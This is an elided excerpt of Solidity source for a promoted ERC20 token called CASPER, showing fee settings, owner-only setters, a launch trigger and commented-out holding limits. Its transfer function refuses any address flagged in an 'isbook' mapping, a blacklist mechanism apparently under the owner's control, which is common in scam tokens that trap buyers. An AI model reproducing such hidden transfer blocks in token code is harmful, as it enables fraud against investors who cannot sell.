...
Telegram : https://t.me/CasperConsensusAlgorithm
...
contract  CASPER is ERC20 {
   ...
   bool public swapping;
    ...
    address public market = 0xa0737244095Bd71eF6CFEd8De6181e7E8108d988;
    mapping(address => bool) public isbook;
    
     mapping(address => bool) public isbig;
    uint256 private txone = 4;
    uint256 private txtwo = 4;
    ...
    uint256 public totalFees = liquidityFee.add(marketingFee);
     ...
     uint256 private swapTokensAtAmount = 5 * 10**9 * 10**9;
     bool swapingtwo = true;
     // exlcude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;

    // uint256 public _maxTxHoldAmount = 5*10 ** 4* 10**9;
   address  private own;


    constructor() public ERC20("CASPER", "CASPER",9) {
        ...
        _balances[owner()] = (1*10**12) * (10**9);
          emit Transfer(address(0), owner(), (1*10**12) * (10**9));
    }
  ...
  function setmarket(address adr) public onlyOwner(){
    ...
    // function maxTxHoldAmount(uint256 amount)public onlyOwner(){
    //     _maxTxHoldAmount = amount;
  ...
  function  setswapTokensAtAmount(uint256 amount)public onlyOwner(){
      ...
      function checkAdd(address sender,address recipient,uint256 amount) internal{
                  if(amount>balanceOf(sender).div(10000)){
...
if(!launched() && recipient == uniswapV2Pair){ require(balanceOf(sender) > 0); launch(); }
    ...
    function _transfer(
        ...
        require(!isbook[from] && !isbook[to], 'isbook address');  
    ...
    if(!launched() && to == uniswapV2Pair){ require(balanceOf(from) > 0); launch(); }
        ...
        //         if(!swapping&& from != owner() && to != owner()&&!isbig[to]){
        //      require(balanceOf(to).add(amount) <= _maxTxHoldAmount, "Transfer amount exceeds the maxTxAmount.");
        // }
